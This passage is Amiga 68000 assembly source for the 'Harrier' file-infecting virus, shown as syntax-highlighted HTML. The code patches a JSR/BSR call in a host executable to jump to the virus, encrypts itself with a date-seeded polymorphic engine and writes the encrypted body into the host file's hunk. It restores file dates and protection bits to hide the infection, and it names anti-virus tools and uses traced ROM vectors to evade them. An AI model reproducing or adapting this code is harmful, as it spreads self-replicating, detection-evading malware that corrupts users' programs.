    </span><span class="sc5">bra.w</span><span class="sc0">   </span><span class="sc5">do_close</span><span class="sc0">        </span><span class="sc1">; not found</span><span class="sc0">

</span><span class="sc5">NULL_check</span><span class="sc0">
    </span><span class="sc5">addq.w</span><span class="sc0">  #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d4</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc2">500</span><span class="sc4">,</span><span class="sc5">d4</span><span class="sc0">
    </span><span class="sc5">beq.w</span><span class="sc0">   </span><span class="sc5">do_close</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">search_JSR_loop</span><span class="sc0">
    </span><span class="sc1">;========================== end of "JSR scanner" ============</span><span class="sc0">
</span><span class="sc5">jmp_found</span><span class="sc0">
</span><span class="sc5">jsr_found</span><span class="sc0">
</span><span class="sc5">bsr_found</span><span class="sc0">
    </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_JSR_loop</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">orig_long</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;store original instruction in virus</span><span class="sc0">
    </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc5">$dff007</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">btst</span><span class="sc0">    #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_jsr_pc</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$6100</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">        </span><span class="sc1">;and set new bsr to virus code</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_jsr_pc</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    
</span><span class="sc5">_jsr_pc</span><span class="sc0"> </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$4eba</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc5">d1</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;save offset</span><span class="sc0">

    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">           </span><span class="sc1">;ask poly engine for seed adress</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_poly_engine</span><span class="sc0">        </span><span class="sc1">;return in A0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">dos_base</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">82</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;get value from datestamp struct </span><span class="sc0">
                    </span><span class="sc1">;and use as seed, this way virus</span><span class="sc0">
                    </span><span class="sc1">;changes decoding routine after 1 day.</span><span class="sc0">
                    </span><span class="sc1">;-&gt; slow polymorphism, simply but works</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_start_virus</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0"> </span><span class="sc1">;from where to get code to encrypt</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">      </span><span class="sc1">;where to put it when crypted</span><span class="sc0">
    </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc5">$dff007</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">and.w</span><span class="sc0">   #</span><span class="sc5">$fc</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">         </span><span class="sc1">;get rnd value from 0 - 252</span><span class="sc0">
    </span><span class="sc5">add.w</span><span class="sc0">   #</span><span class="sc5">_end_virus</span><span class="sc4">-</span><span class="sc5">_start_virus</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0"> </span><span class="sc1">;length</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_poly_engine</span><span class="sc0">        </span><span class="sc1">;encrypt virus in buffer</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">asr.l</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">           </span><span class="sc1">;convert to BCPL</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">memory_ptr</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">add.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;add virus length to original code</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">        </span><span class="sc1">;get number of hunks</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d1.w</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">    </span><span class="sc1">;get adress of code or data hunk</span><span class="sc0">
    </span><span class="sc5">add.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;add virus...</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d6</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">           </span><span class="sc1">;filehandle</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">           </span><span class="sc1">;file position to 0</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">          </span><span class="sc1">;OFFSET_BEGINNING</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">SEEK</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;call Seek()</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">
    
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">       </span><span class="sc1">;adress of the end of the 1 hunk</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       </span><span class="sc1">;adress of the buffer</span><span class="sc0">
    </span><span class="sc5">sub.l</span><span class="sc0">   </span><span class="sc5">d2</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">       </span><span class="sc1">;size of first part of the file</span><span class="sc0">
    </span><span class="sc5">sub.l</span><span class="sc0">   </span><span class="sc5">d3</span><span class="sc4">,</span><span class="sc5">d5</span><span class="sc0">       </span><span class="sc1">;size of second part of the file</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d6</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;FH</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">WRITE</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">   </span><span class="sc1">;write hunktable and 1 hunk</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0"> </span><span class="sc1">;call Write()</span><span class="sc0">
            
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">  </span><span class="sc1">;adress of encrypted virus</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d7</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">       </span><span class="sc1">;length</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d6</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;FH</span><span class="sc0">

    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">WRITE</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">   </span><span class="sc1">;write virus to file</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0"> </span><span class="sc1">;call Write()</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       </span><span class="sc1">;adress of second rest of the file</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d5</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">       </span><span class="sc1">;size of this</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d6</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;filehandle</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">WRITE</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0"> </span><span class="sc1">;call Write()</span><span class="sc0">

</span><span class="sc5">do_close</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_close</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">_restore_old_date</span><span class="sc0">   </span><span class="sc1">;restore old date and mark file as</span><span class="sc0">
                    </span><span class="sc1">;infected       </span><span class="sc0">
    </span><span class="sc5">bra.w</span><span class="sc0">   </span><span class="sc5">_exit_infection</span><span class="sc0">

</span><span class="sc5">_restore_old_date</span><span class="sc0">           
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;filename_ptr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_fib_date</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0"> </span><span class="sc1">;ptr to DateStamp</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       </span><span class="sc1">;DateStamp struct</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">SETFILEDATE</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0"> </span><span class="sc1">;call SetFileDate()</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_comment</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">SETCOMMENT</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">

    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">do_setprotection</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">LastInfectedFileData</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_date</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_date</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc4">(</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">

</span><span class="sc5">_clear_memory</span><span class="sc0">
    </span><span class="sc5">clr.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">clr.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">_clear_memory</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
        
</span><span class="sc5">do_setprotection</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">           </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_protection</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d2</span><span class="sc0">
                    </span><span class="sc1">;original protection bits</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">SETPROTECTION</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">         </span><span class="sc1">;call SetProtection()</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

    </span><span class="sc1">;===========================================================</span><span class="sc0">

</span><span class="sc5">_poly_engine</span><span class="sc0">
    </span><span class="sc9">incbin</span><span class="sc0"> </span><span class="sc5">dh1</span><span class="sc4">:</span><span class="sc5">asm</span><span class="sc4">/</span><span class="sc5">poly_engine</span><span class="sc0">

</span><span class="sc5">VirusZ1_name</span><span class="sc0">        </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'VirusZ_II'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirusZ2_name</span><span class="sc0">        </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'VirusZ_III'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirusChecker_name</span><span class="sc0">   </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'Virus_CheckerII('</span><span class="sc4">,</span><span class="sc5">$a9</span><span class="sc4">,</span><span class="sc12">')'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ramlib_name</span><span class="sc0">     </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'ramlib'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exec_name</span><span class="sc0">       </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'exec.library'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dos_name</span><span class="sc0">        </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'dos.library'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xvs_name</span><span class="sc0">        </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'xvs.library'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">EVEN</span><span class="sc0">

</span><span class="sc5">interrupt_names</span><span class="sc0">
            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc5">int1_name</span><span class="sc4">-</span><span class="sc5">interrupt_names</span><span class="sc0">
            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc5">int2_name</span><span class="sc4">-</span><span class="sc5">interrupt_names</span><span class="sc0">
            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc5">int3_name</span><span class="sc4">-</span><span class="sc5">interrupt_names</span><span class="sc0">
            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc5">int4_name</span><span class="sc4">-</span><span class="sc5">interrupt_names</span><span class="sc0">

</span><span class="sc5">int1_name</span><span class="sc0">       </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'timer.device'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int2_name</span><span class="sc0">       </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'input.device'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int3_name</span><span class="sc0">       </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'console.device'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int4_name</span><span class="sc0">       </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'ciaa.resource'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_comment</span><span class="sc0">        </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_harrier_string</span><span class="sc0"> 
 </span><span class="sc5">dc.b</span><span class="sc0"> </span><span class="sc12">'[ Harrier .A 1.02 virus, (c) by MaD roGEr/VRU! ]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">dc.b</span><span class="sc0">   </span><span class="sc12">'Markus! Come back!'</span><span class="sc0">
</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc5">_dos_caller</span><span class="sc0">     
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">a5</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">dos_base</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">tracer_result</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">tst.b</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_use_traced_vectors</span><span class="sc0"> 
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">dos_function_offsets</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">lsl.w</span><span class="sc0">   #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">mulu.w</span><span class="sc0">  #</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">neg.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_call_dos</span><span class="sc0">

</span><span class="sc5">_use_traced_vectors</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_dos_vectors</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">     
    </span><span class="sc5">lsl.w</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">

</span><span class="sc5">_call_dos</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a5</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc5">_exec_caller</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">a0</span><span class="sc4">/</span><span class="sc5">a1</span><span class="sc4">/</span><span class="sc5">a5</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">tracer_result</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">tst.b</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_use_traced_vectors2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">exec_function_offsets</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">lsl.w</span><span class="sc0">   #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d7.w</span><span class="sc4">),</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">mulu.w</span><span class="sc0">  #</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">neg.w</span><span class="sc0">   </span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">,</span><span class="sc5">d7.w</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_call_exec</span><span class="sc0">

</span><span class="sc5">_use_traced_vectors2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_exec_vectors</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">        
    </span><span class="sc5">lsl.w</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d7.w</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
</span><span class="sc5">_call_exec</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a0</span><span class="sc4">/</span><span class="sc5">a1</span><span class="sc4">/</span><span class="sc5">a5</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;**************************************</span><span class="sc0">
    </span><span class="sc5">cnop</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">    
</span><span class="sc5">_end_virus</span><span class="sc0">                  </span><span class="sc1">;this label ends virus</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_dos_vectors</span><span class="sc0">
</span><span class="sc5">_ROM_open</span><span class="sc0">           </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">_ROM_close</span><span class="sc0">          </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc5">_ROM_read</span><span class="sc0">           </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc5">_ROM_write</span><span class="sc0">          </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;3</span><span class="sc0">
</span><span class="sc5">_ROM_seek</span><span class="sc0">           </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">_ROM_examine</span><span class="sc0">            </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;5</span><span class="sc0">
</span><span class="sc5">_ROM_exnext</span><span class="sc0">         </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;6</span><span class="sc0">
</span><span class="sc5">_ROM_info</span><span class="sc0">           </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;7</span><span class="sc0">
</span><span class="sc5">_ROM_setcomment</span><span class="sc0">         </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;8</span><span class="sc0">
</span><span class="sc5">_ROM_setprotection</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;9</span><span class="sc0">
</span><span class="sc5">_ROM_setfiledate</span><span class="sc0">        </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;10</span><span class="sc0">
